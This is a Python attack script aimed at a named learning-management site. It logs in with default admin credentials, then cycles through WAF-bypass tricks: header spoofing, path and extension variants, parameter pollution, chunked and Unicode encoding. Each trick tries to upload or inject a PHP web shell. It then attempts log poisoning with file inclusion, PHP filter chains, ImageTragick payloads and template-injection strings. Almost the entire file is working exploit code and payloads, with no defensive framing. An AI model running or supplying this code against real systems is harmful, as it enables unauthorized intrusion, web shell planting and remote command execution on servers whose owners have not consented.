import requests
import re
import time
import base64
import urllib.parse

BASE_URL = "https://lms.rocket-soft.org"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()

def login():
    print("[*] Logging in as Admin...")
    try:
        r = session.get(f"{BASE_URL}/admin/login")
        csrf_token = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
        data = {"_token": csrf_token, "email": ADMIN_EMAIL, "password": ADMIN_PASS}
        r = session.post(f"{BASE_URL}/admin/login", data=data)
        if "/admin" in r.url or "/panel" in r.url:
            print("[+] Login successful.")
            return True
        else:
            print("[-] Login failed.")
            return False
    except Exception as e:
        print(f"[-] Login error: {e}")
        return False

def get_csrf(url):
    try:
        r = session.get(url)
        match = re.search(r'name="_token" value="([^"]+)"', r.text)
        return match.group(1) if match else None
    except:
        return None

# ============================================
# WAF BYPASS TECHNIQUES
# ============================================

def bypass_content_type():
    """Try different Content-Types to bypass WAF"""
    print("\n[*] Testing Content-Type Bypass...")
    
    csrf = get_csrf(f"{BASE_URL}/admin/update/basic-update")
    shell = "<?php system($_GET['c']); ?>"
    
    content_types = [
        "multipart/form-data",
        "application/json",
        "application/x-www-form-urlencoded",
        "text/plain",
        "application/octet-stream",
        "image/png",
        "application/xml",
    ]
    
    for ct in content_types:
        try:
            headers = {"Content-Type": ct}
            data = f'_token={csrf}&file={shell}'
            r = session.post(f"{BASE_URL}/admin/update/basic-update", 
                           data=data, headers=headers)
            print(f"    {ct}: Status {r.status_code}")
            if r.status_code not in [403, 419]:
                print(f"    [!] Potential bypass found!")
        except:
            pass

def bypass_http_methods():
    """Try different HTTP methods"""
    print("\n[*] Testing HTTP Method Bypass...")
    
    methods = [
        ('POST', f"{BASE_URL}/admin/update/basic-update"),
        ('PUT', f"{BASE_URL}/admin/update/basic-update"),
        ('PATCH', f"{BASE_URL}/admin/update/basic-update"),
        ('OPTIONS', f"{BASE_URL}/admin/update/basic-update"),
        ('TRACE', f"{BASE_URL}/admin/update/basic-update"),
        # X-HTTP-Method-Override
    ]
    
    csrf = get_csrf(f"{BASE_URL}/admin/settings")
    
    for method, url in methods:
        try:
            r = session.request(method, url, data={'_token': csrf})
            print(f"    {method}: Status {r.status_code}")
        except:
            pass
    
    # Try method override headers
    override_headers = [
        {"X-HTTP-Method-Override": "POST"},
        {"X-Method-Override": "POST"},
        {"X-HTTP-Method": "POST"},
    ]
    
    for headers in override_headers:
        try:
            r = session.get(f"{BASE_URL}/admin/update/basic-update", headers=headers)
            print(f"    Override {list(headers.keys())[0]}: Status {r.status_code}")
        except:
            pass

def bypass_url_encoding():
    """Try URL encoding variations"""
    print("\n[*] Testing URL Encoding Bypass...")
    
    # Different URL patterns
    patterns = [
        "/admin/update/basic-update",
        "/admin/update//basic-update",
        "/admin/update/./basic-update",
        "/admin/update/basic-update/.",
        "/admin/update/basic-update%00",
        "/admin/update/basic-update%20",
        "/admin/update/basic-update?",
        "/admin/update/basic-update#",
        "/Admin/Update/Basic-Update",  # Case variation
        "/ADMIN/UPDATE/BASIC-UPDATE",
        "/admin%2Fupdate%2Fbasic-update",  # URL encoded slashes
        "/admin/update/basic-update;",
        "/admin/update/basic-update/..",
    ]
    
    csrf = get_csrf(f"{BASE_URL}/admin/settings")
    
    for pattern in patterns:
        try:
            r = session.post(f"{BASE_URL}{pattern}", data={'_token': csrf})
            if r.status_code != 403:
                print(f"    [!] {pattern}: Status {r.status_code}")
        except:
            pass

def bypass_header_injection():
    """Try header-based bypasses"""
    print("\n[*] Testing Header Injection Bypass...")
    
    # Headers that might bypass WAF
    bypass_headers = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Host": "127.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        {"Host": "localhost"},  # Host header injection
        {"X-Original-URL": "/admin/update/basic-update"},  # Nginx bypass
        {"X-Rewrite-URL": "/admin/update/basic-update"},
    ]
    
    csrf = get_csrf(f"{BASE_URL}/admin/settings")
    
    for headers in bypass_headers:
        try:
            all_headers = dict(headers)
            r = session.post(f"{BASE_URL}/admin/update/basic-update", 
                           data={'_token': csrf}, headers=all_headers)
            if r.status_code != 403:
                print(f"    [!] {headers}: Status {r.status_code}")
        except:
            pass

def bypass_file_extension():
    """Try different file extensions and MIME types"""
    print("\n[*] Testing File Extension Bypass...")
    
    shell_code = b"<?php system($_GET['c']); ?>"
    
    # Different extensions and payloads
    payloads = [
        ("shell.php", shell_code, "application/octet-stream"),
        ("shell.pHP", shell_code, "application/octet-stream"),
        ("shell.PHP", shell_code, "application/octet-stream"),
        ("shell.pHp7", shell_code, "application/octet-stream"),
        ("shell.phtml", shell_code, "application/octet-stream"),
        ("shell.php.png", shell_code, "image/png"),
        ("shell.php.jpg", shell_code, "image/jpeg"),
        ("shell.php%00.png", shell_code, "image/png"),
        ("shell.php::$DATA", shell_code, "application/octet-stream"),  # NTFS alternate stream
        (".htaccess", b"AddType application/x-httpd-php .png", "text/plain"),
        (".user.ini", b"auto_prepend_file=shell.png", "text/plain"),
        ("shell.php;.png", shell_code, "image/png"),
        ("shell.php\x00.png", shell_code, "image/png"),
    ]
    
    csrf = get_csrf(f"{BASE_URL}/panel/setting")
    
    for filename, content, mime in payloads[:5]:  # Test first 5
        try:
            files = {'avatar': (filename, content, mime)}
            data = {'_token': csrf}
            r = session.post(f"{BASE_URL}/panel/setting", files=files, data=data)
            if r.status_code not in [403, 419]:
                print(f"    [!] {filename} ({mime}): Status {r.status_code}")
        except:
            pass

def bypass_parameter_pollution():
    """Test HTTP Parameter Pollution to bypass WAF"""
    print("\n[*] Testing HTTP Parameter Pollution...")
    
    csrf = get_csrf(f"{BASE_URL}/admin/settings")
    
    # Parameter pollution patterns
    patterns = [
        {"_token": csrf, "file": "normal.txt", "file": "<?php system($_GET['c']); ?>"},  # Duplicate key
        [("_token", csrf), ("file", "normal.txt"), ("file", "<?php system($_GET['c']); ?>")],  # As list
    ]
    
    for pattern in patterns:
        try:
            if isinstance(pattern, list):
                r = session.post(f"{BASE_URL}/admin/update/basic-update", data=pattern)
            else:
                r = session.post(f"{BASE_URL}/admin/update/basic-update", data=pattern)
            print(f"    Status: {r.status_code}")
        except:
            pass

def bypass_chunked_transfer():
    """Test chunked transfer encoding bypass"""
    print("\n[*] Testing Chunked Transfer Encoding Bypass...")
    
    csrf = get_csrf(f"{BASE_URL}/admin/settings")
    
    # Build chunked request manually
    payload = f"_token={csrf}&file=<?php system($_GET['c']); ?>"
    
    headers = {
        "Transfer-Encoding": "chunked",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    # Create chunked body
    def to_chunked(data):
        chunks = []
        chunk_size = 10
        for i in range(0, len(data), chunk_size):
            chunk = data[i:i+chunk_size]
            chunks.append(f"{len(chunk):x}\r\n{chunk}\r\n")
        chunks.append("0\r\n\r\n")
        return "".join(chunks)
    
    try:
        r = session.post(f"{BASE_URL}/admin/update/basic-update",
                        data=to_chunked(payload),
                        headers=headers)
        print(f"    Status: {r.status_code}")
    except Exception as e:
        print(f"    Error: {e}")

def bypass_unicode_normalization():
    """Test Unicode normalization bypass"""
    print("\n[*] Testing Unicode Normalization Bypass...")
    
    # Unicode variations of PHP tags
    payloads = [
        "<?php system($_GET['c']); ?>",
        "\uff1c?php system($_GET['c']); ?\uff1e",  # Fullwidth angle brackets
        "<?php\u200bsystem($_GET['c']);\u200b?>",  # Zero-width space
        "<?php\u00a0system($_GET['c']); ?>",  # Non-breaking space
    ]
    
    csrf = get_csrf(f"{BASE_URL}/panel/setting")
    
    for payload in payloads:
        try:
            data = {'_token': csrf, 'about': payload}
            r = session.post(f"{BASE_URL}/panel/setting", data=data)
            if r.status_code == 200:
                # Check if payload survived
                check = session.get(f"{BASE_URL}/panel/setting")
                if "system" in check.text:
                    print(f"    [!] Payload injected: {payload[:30]}...")
        except:
            pass

# ============================================
# 0-DAY EXPLOITATION TECHNIQUES
# ============================================

def exploit_log_poisoning():
    """Try to poison log files and include them"""
    print("\n[*] Testing Log Poisoning + LFI...")
    
    # Inject PHP into User-Agent
    malicious_ua = "<?php system($_GET['c']); ?>"
    
    headers = {"User-Agent": malicious_ua}
    
    # Make request to inject into access log
    session.get(f"{BASE_URL}/", headers=headers)
    
    # Try to include log files
    log_paths = [
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/httpd/access_log",
        "/proc/self/fd/1",
        "../../../../../var/log/apache2/access.log",
    ]
    
    # Look for LFI endpoints
    lfi_endpoints = [
        "/panel/setting?page=",
        "/?page=",
        "/admin?view=",
    ]
    
    for endpoint in lfi_endpoints:
        for log in log_paths:
            try:
                r = session.get(f"{BASE_URL}{endpoint}{log}", timeout=5)
                if "system" in r.text or "uid=" in r.text:
                    print(f"    [!] LFI + Log Poison success: {endpoint}{log}")
                    return True
            except:
                pass
    
    print("    No LFI found")
    return False

def exploit_php_filter_chain():
    """Try PHP filter chain for RCE without file write"""
    print("\n[*] Testing PHP Filter Chain RCE...")
    
    # PHP filter chain to generate webshell
    # This is a complex technique using php://filter
    
    # Base64 encoded webshell: <?php system($_GET[0]); ?>
    encoded_shell = "PD9waHAgc3lzdGVtKCRfR0VUWzBdKTsgPz4="
    
    # Filter chain patterns
    filter_chains = [
        f"php://filter/convert.base64-decode/resource=data://text/plain;base64,{encoded_shell}",
        f"php://filter/read=convert.base64-decode/resource=data:text/plain;base64,{encoded_shell}",
    ]
    
    # Try to find any file inclusion point
    endpoints = [
        "/panel/setting?lang=",
        "/?locale=",
        "/admin?template=",
    ]
    
    for endpoint in endpoints:
        for chain in filter_chains:
            try:
                r = session.get(f"{BASE_URL}{endpoint}{urllib.parse.quote(chain)}", timeout=5)
                if r.status_code == 200 and "<?php" not in r.text:
                    print(f"    Interesting response at {endpoint}")
            except:
                pass
    
    return False

def exploit_image_tragick():
    """Test for ImageMagick/ImageTragick vulnerability"""
    print("\n[*] Testing ImageMagick (ImageTragick) Exploit...")
    
    # ImageTragick payload (CVE-2016-3714)
    mvg_payload = '''push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id > /tmp/pwned.txt")'
pop graphic-context'''
    
    svg_payload = '''<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="640px" height="480px" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://example.com/image.jpg&quot;|id > /tmp/pwned.txt&quot;" x="0" y="0" height="640px" width="480px"/>
</svg>'''
    
    csrf = get_csrf(f"{BASE_URL}/panel/setting")
    
    # Try uploading malicious images
    payloads = [
        ("exploit.mvg", mvg_payload.encode(), "image/x-mvg"),
        ("exploit.svg", svg_payload.encode(), "image/svg+xml"),
    ]
    
    for filename, content, mime in payloads:
        try:
            files = {'avatar': (filename, content, mime)}
            data = {'_token': csrf}
            r = session.post(f"{BASE_URL}/panel/setting", files=files, data=data)
            if r.status_code not in [403, 419, 422]:
                print(f"    [!] {filename}: Status {r.status_code}")
        except:
            pass
    
    return False

def exploit_ssti_advanced():
    """Advanced SSTI bypass techniques"""
    print("\n[*] Testing Advanced SSTI Bypasses...")
    
    # Advanced SSTI payloads with filter bypass
    payloads = [
        # String concatenation
        "{{''['s'+'ystem']('id')}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",  # Jinja2 sandbox bypass
        # Attribute access via getattr
        "{{request['__class__']}}",
        "{{config}}",
        "{{self}}",
        # PHP specific
        "{{app}}",
        "{{app.request}}",
        # Blade specific with encoding
        "@{{system('id')}}",
        "{{%0asystem('id')%0a}}",  # Newline bypass
        "{{/**/system('id')/**/}}",  # Comment bypass
        # Math operations to confirm SSTI
        "{{7*'7'}}",
        "{{config['SECRET_KEY']}}",
        # Unicode bypass
        "{{ｓystem('id')}}",  # Fullwidth
    ]
    
    csrf = get_csrf(f"{BASE_URL}/panel/setting")
    
    for payload in payloads:
        try:
            data = {'_token': csrf, 'about': payload, 'bio': payload}
            r = session.post(f"{BASE_URL}/panel/setting", data=data)
            
            if r.status_code == 200:
                check = session.get(f"{BASE_URL}/panel/setting")
                
                # Check for SSTI indicators
                if "49" in check.text or "uid=" in check.text or "7777777" in check.text:
                    print(f"    [!] SSTI works: {payload}")
                if "subclasses" in check.text or "SECRET_KEY" in check.text:
                    print(f"    [!] Object access: {payload}")
        except:
            pass
    
    return False

def main():
    if not login():
        return
    
    print("\n" + "="*60)
    print("        ADVANCED WAF BYPASS EXPLOITATION")
    print("="*60)
    
    # WAF Bypass Techniques
    bypass_content_type()
    bypass_http_methods()
    bypass_url_encoding()
    bypass_header_injection()
    bypass_file_extension()
    bypass_parameter_pollution()
    bypass_chunked_transfer()
    bypass_unicode_normalization()
    
    # 0-day Techniques
    exploit_log_poisoning()
    exploit_php_filter_chain()
    exploit_image_tragick()
    exploit_ssti_advanced()
    
    print("\n" + "="*60)
    print("        EXPLOITATION COMPLETE")
    print("="*60)

if __name__ == "__main__":
    main()
